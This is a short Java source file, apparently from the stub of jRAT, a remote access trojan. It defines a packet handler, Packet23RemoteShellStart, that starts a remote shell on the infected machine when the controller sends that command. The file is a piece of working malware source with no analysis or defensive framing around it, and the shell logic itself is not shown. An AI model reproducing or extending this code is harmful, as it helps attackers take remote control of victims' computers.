package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.RemoteShell;

public class Packet23RemoteShellStart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new RemoteShell(con).start();
	}

}
